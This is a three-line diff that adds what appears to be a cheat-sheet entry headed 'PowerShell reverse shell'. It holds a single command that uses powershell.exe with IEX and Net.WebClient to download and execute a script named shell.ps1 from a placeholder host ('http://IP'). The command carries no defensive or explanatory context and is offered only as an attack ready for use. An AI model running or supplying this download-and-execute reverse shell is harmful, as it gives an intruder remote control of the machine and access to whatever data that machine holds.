@@ -1,0 +1,3 @@
+PowerShell reverse shell
+
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\")
